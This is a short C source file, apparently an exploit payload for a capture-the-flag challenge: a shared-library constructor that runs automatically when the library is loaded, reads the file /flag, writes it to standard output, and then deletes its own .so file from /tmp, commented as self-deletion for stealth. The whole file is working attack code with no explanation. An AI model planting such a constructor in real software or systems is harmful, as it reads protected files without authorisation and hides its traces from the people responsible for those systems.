#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
void my_init() {
    char buf[256];
    int fd = open("/flag", O_RDONLY);
    if (fd < 0) {
        exit(1);
    }

    int n = read(fd, buf, sizeof(buf) - 1);
    if (n > 0) {
        buf[n] = 0;
        write(1, buf, n);
    }
    close(fd);

    // Self-delete for stealth
    unlink("/tmp/myplugin_constructor.so");
}
